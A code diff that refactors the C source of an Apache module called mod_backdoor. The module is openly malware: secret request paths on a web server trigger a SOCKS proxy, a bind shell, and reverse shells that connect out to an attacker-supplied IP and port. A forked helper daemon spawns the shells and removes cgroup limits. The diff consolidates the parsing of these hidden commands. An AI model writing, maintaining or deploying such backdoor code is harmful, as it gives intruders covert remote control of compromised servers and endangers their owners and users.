@@ -34,7 +34,6 @@
 #include "http_log.h"
 #include "ap_config.h"
 
-#include "mod_backdoor.h"
 #include "socks.h"
 
 /* ------------------------------------------------------------------ */
@@ -53,6 +52,119 @@
 
 /* PID of the forked IPC daemon (set in backdoor_post_config) */
 pid_t pid;
+
+/* ------------------------------------------------------------------ */
+/* URI parsing types and functions                                    */
+/* ------------------------------------------------------------------ */
+
+typedef enum {
+    CMD_PING,
+    CMD_SOCKS,
+    CMD_BIND,
+    CMD_REVSHELL,
+    CMD_REVTY,
+    CMD_UNKNOWN
+} cmd_t;
+
+typedef struct {
+    cmd_t type;
+    char *ip;
+    char *port;
+    char *prog;
+    char *user;
+    int port_num;
+} parsed_cmd_t;
+
+static cmd_t classify_uri(const char *uri) {
+    if (!uri) return CMD_UNKNOWN;
+    if (strcmp(uri, "/ping") == 0) return CMD_PING;
+    if (strstr(uri, "/proxy") != NULL) return CMD_SOCKS;
+    if (strstr(uri, "/bind") != NULL) return CMD_BIND;
+    if (strstr(uri, "/reverse") != NULL) return CMD_REVSHELL;
+    if (strstr(uri, "/revtty") != NULL) return CMD_REVTY;
+    return CMD_UNKNOWN;
+}
+
+static char *safe_strdup(const char *s) {
+    if (!s) return NULL;
+    return strdup(s);
+}
+
+static int parse_uri(const char *uri, parsed_cmd_t *out) {
+    if (!uri || !out) return -1;
+
+    memset(out, 0, sizeof(*out));
+    out->type = classify_uri(uri);
+    if (out->type == CMD_UNKNOWN) return -1;
+
+    char *copy = strdup(uri);
+    if (!copy) return -1;
+
+    switch (out->type) {
+    case CMD_PING:
+        break;
+
+    case CMD_SOCKS: {
+        strtok(copy, "/");  /* skip "proxy" */
+        char *port = strtok(NULL, "/");
+        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
+        out->port = safe_strdup(port);
+        out->port_num = atoi(port);
+        char *user = strtok(NULL, "/");
+        if (user) out->user = safe_strdup(user);
+        break;
+    }
+
+    case CMD_BIND: {
+        strtok(copy, "/");  /* skip "bind" */
+        char *port = strtok(NULL, "/");
+        if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
+        out->port = safe_strdup(port);
+        out->port_num = atoi(port);
+        break;
+    }
+
+    case CMD_REVSHELL: {
+        strtok(copy, "/");  /* skip "reverse" */
+        char *ip = strtok(NULL, "/");
+        char *port = strtok(NULL, "/");
+        char *prog = strtok(NULL, "/");
+        if (!ip || !port || !prog) { free(copy); out->type = CMD_UNKNOWN; return -1; }
+        out->ip = safe_strdup(ip);
+        out->port = safe_strdup(port);
+        out->prog = safe_strdup(prog);
+        out->port_num = atoi(port);
+        break;
+    }
+
+    case CMD_REVTY: {
+        strtok(copy, "/");  /* skip "revtty" */
+        char *ip = strtok(NULL, "/");
+        char *port = strtok(NULL, "/");
+        if (!ip || !port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
+        out->ip = safe_strdup(ip);
+        out->port = safe_strdup(port);
+        out->port_num = atoi(port);
+        break;
+    }
+
+    default:
+        free(copy);
+        return -1;
+    }
+
+    free(copy);
+    return 0;
+}
+
+static void free_parsed_cmd(parsed_cmd_t *cmd) {
+    if (!cmd) return;
+    free(cmd->ip);
+    free(cmd->port);
+    free(cmd->prog);
+    free(cmd->user);
+    memset(cmd, 0, sizeof(*cmd));
+}
 
 /* ------------------------------------------------------------------ */
 /* Reverse shell helpers                                              */
@@ -319,30 +431,25 @@ static void handle_socks_request(request_rec *r, int client_fd) {
 }
 
 /*
- * Bind shell handler. Parses the port from the URI (/bind/<PORT>),
- * binds a listening socket, accepts a connection, then relays data
- * between the connected socket and the IPC daemon.
+ * Bind shell handler. Binds a listening socket on the parsed port,
+ * accepts a connection, then relays data between the connected socket
+ * and the IPC daemon.
  */
 static void handle_bind_request(request_rec *r, int client_fd) {
-    char *port_copy = strdup(r->uri);
-    char *slash = strchr(port_copy, '/');
-    if (!slash) { free(port_copy); send_error_to_client(client_fd, "ERR\n"); }
-    char *word = slash + 1;
-    slash = strchr(word, '/');
-    if (!slash) { free(port_copy); send_error_to_client(client_fd, "ERR\n"); }
-    char *port = slash + 1;
-    slash = strchr(port, '/');
-    if (slash) *slash = '\0';
+    parsed_cmd_t cmd;
+    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_BIND || !cmd.port) {
+        send_error_to_client(client_fd, "ERR\n");
+    }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free(port_copy);
+        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
 
-    int bindfd = bindPort(client_fd, atoi(port));
-    char *info = malloc(strlen("[+] Shell binded on port \n") + strlen(port) + 1);
-    sprintf(info, "[+] Shell binded on port %s\n", port);
+    int bindfd = bindPort(client_fd, cmd.port_num);
+    char *info = malloc(strlen("[+] Shell binded on port \n") + strlen(cmd.port) + 1);
+    sprintf(info, "[+] Shell binded on port %s\n", cmd.port);
     write(client_fd, info, strlen(info));
     free(info);
     close(client_fd);
@@ -351,14 +458,14 @@ static void handle_bind_request(request_rec *r, int client_fd) {
     socklen_t server_len = sizeof(server_addr);
     server_addr.sin_family = AF_INET;
     server_addr.sin_addr.s_addr = INADDR_ANY;
-    server_addr.sin_port = htons(atoi(port));
+    server_addr.sin_port = htons(cmd.port_num);
 
     int new_socket = accept(bindfd, (struct sockaddr *)&server_addr, &server_len);
     close(bindfd);
     write(ipc_sock, "BIND", strlen("BIND"));
     bicomIPC(ipc_sock, new_socket);
     close(new_socket);
-    free(port_copy);
+    free_parsed_cmd(&cmd);
 }
 
 /* Health check endpoint */
@@ -374,25 +481,25 @@ static void handle_ping_request(int client_fd) {
  * which parses it and spawns the appropriate reverse shell.
  */
 static void handle_reverse_shell_request(request_rec *r, int client_fd) {
-    char *uri_copy = strdup(r->uri);
-    char *tok = strtok(uri_copy, "/");
-    char *ip = strtok(NULL, "/");
-    char *port = strtok(NULL, "/");
-    char *prog = strtok(NULL, "/");
+    parsed_cmd_t cmd;
+    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVSHELL
+        || !cmd.ip || !cmd.port || !cmd.prog) {
+        send_error_to_client(client_fd, "ERR\n");
+    }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free(uri_copy);
+        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
     write(ipc_sock, r->uri, strlen(r->uri));
 
     char *info = malloc(strlen("[+] Sending Reverse Shell to : using \n")
-                        + strlen(ip) + strlen(port) + strlen(prog) + 1);
-    sprintf(info, "[+] Sending Reverse Shell to %s:%s using %s\n", ip, port, prog);
+                        + strlen(cmd.ip) + strlen(cmd.port) + strlen(cmd.prog) + 1);
+    sprintf(info, "[+] Sending Reverse Shell to %s:%s using %s\n", cmd.ip, cmd.port, cmd.prog);
     write(client_fd, info, strlen(info));
     free(info);
-    free(uri_copy);
+    free_parsed_cmd(&cmd);
     close(client_fd);
     exit(0);
 }
@@ -405,38 +512,39 @@ static void handle_reverse_shell_request(request_rec *r, int client_fd) {
 static void handle_revtty_request(request_rec *r, int client_fd) {
     if (!pid) return;
 
-    char *uri_copy = strdup(r->uri);
-    strtok(uri_copy, "/");
-    char *ip = strtok(NULL, "/");
-    char *port = strtok(NULL, "/");
+    parsed_cmd_t cmd;
+    if (parse_uri(r->uri, &cmd) != 0 || cmd.type != CMD_REVTY
+        || !cmd.ip || !cmd.port) {
+        send_error_to_client(client_fd, "ERR\n");
+    }
 
     int revsockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (revsockfd < 0) {
-        free(uri_copy);
+        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
     struct sockaddr_in client_addr;
-    client_addr.sin_addr.s_addr = inet_addr(ip);
+    client_addr.sin_addr.s_addr = inet_addr(cmd.ip);
     client_addr.sin_family = AF_INET;
-    client_addr.sin_port = htons(atoi(port));
+    client_addr.sin_port = htons(cmd.port_num);
     if (connect(revsockfd, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
-        free(uri_copy);
+        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "[+] Reverse socket can't connect to client\n");
     }
 
     int ipc_sock = connect_ipc();
     if (ipc_sock < 0) {
-        free(uri_copy);
+        free_parsed_cmd(&cmd);
         send_error_to_client(client_fd, "ERRNOSOCK\n");
     }
     write(ipc_sock, "SHELL\n", strlen("SHELL\n") + 1);
 
     char *info = malloc(strlen("[+] Sending Reverse Shell to :")
-                        + strlen(ip) + strlen(port) + 1);
-    sprintf(info, "[+] Sending Reverse Shell to %s:%s", ip, port);
+                        + strlen(cmd.ip) + strlen(cmd.port) + 1);
+    sprintf(info, "[+] Sending Reverse Shell to %s:%s", cmd.ip, cmd.port);
     write(client_fd, info, strlen(info));
     free(info);
-    free(uri_copy);
+    free_parsed_cmd(&cmd);
     bicomIPC(ipc_sock, revsockfd);
     close(client_fd);
     exit(0);
@@ -469,16 +577,28 @@ static int backdoor_post_read_request(request_rec *r) {
     int client_fd = get_client_fd(r);
     if (client_fd < 0) return DECLINED;
 
-    if (!strcmp(r->uri, PINGWORD)) {
+    parsed_cmd_t cmd;
+    if (parse_uri(r->uri, &cmd) != 0) return DECLINED;
+
+    switch (cmd.type) {
+    case CMD_PING:
         handle_ping_request(client_fd);
-    } else if (strstr(r->uri, SOCKSWORD)) {
+        break;
+    case CMD_SOCKS:
         handle_socks_request(r, client_fd);
-    } else if (strstr(r->uri, BINDWORD)) {
+        break;
+    case CMD_BIND:
         handle_bind_request(r, client_fd);
-    } else if (strstr(r->uri, REVERSESHELL)) {
+        break;
+    case CMD_REVSHELL:
         handle_reverse_shell_request(r, client_fd);
-    } else if (strstr(r->uri, SHELLWORD)) {
+        break;
+    case CMD_REVTY:
         handle_revtty_request(r, client_fd);
+        break;
+    default:
+        free_parsed_cmd(&cmd);
+        return DECLINED;
     }
 
     return DECLINED;
@@ -549,18 +669,18 @@ static int waitIPC(int master) {
                 if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                     rmCgroup();
                     shellPTY(sd);
-                } else if (strstr(buf, "reverse")) {
-                    rmCgroup();
-                    strtok(buf, "/");
-                    char *ip = strtok(NULL, "/");
-                    char *port = strtok(NULL, "/");
-                    char *prog = strtok(NULL, "/");
-                    reverseShell(ip, port, prog);
-                } else if (strstr(buf, SOCKSWORD)) {
-                    strtok(buf, "/");
-                    char *port = strtok(NULL, "/");
-                    char *user = strtok(NULL, "/");
-                    startProxy("0.0.0.0", atoi(port), user, PASSWORD);
+                } else {
+                    /* Parse URI from IPC message */
+                    parsed_cmd_t cmd;
+                    if (parse_uri(buf, &cmd) == 0) {
+                        if (cmd.type == CMD_REVSHELL) {
+                            rmCgroup();
+                            reverseShell(cmd.ip, cmd.port, cmd.prog);
+                        } else if (cmd.type == CMD_SOCKS) {
+                            startProxy("0.0.0.0", cmd.port_num, cmd.user, PASSWORD);
+                        }
+                        free_parsed_cmd(&cmd);
+                    }
                 }
                 exit(0);
             }
